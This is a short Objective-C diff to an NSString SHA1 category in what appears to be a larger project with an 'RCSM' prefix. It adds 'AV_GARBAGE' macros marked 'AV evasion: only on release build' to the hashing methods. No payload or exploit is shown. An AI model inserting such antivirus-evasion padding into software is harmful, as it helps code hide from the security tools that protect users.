@@ -17,19 +17,26 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
 
 @implementation NSString (SHA1)
 
-- (NSData *)sha1Hash
-{
-  return [[self dataUsingEncoding: NSUTF8StringEncoding
-             allowLossyConversion: NO] sha1Hash];
-}
-
 - (NSString *)sha1HexHash
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   return [[self dataUsingEncoding: NSUTF8StringEncoding
              allowLossyConversion: NO] sha1HexHash];
+}
+
+- (NSData *)sha1Hash
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  return [[self dataUsingEncoding: NSUTF8StringEncoding
+             allowLossyConversion: NO] sha1Hash];
 }
 
 @end
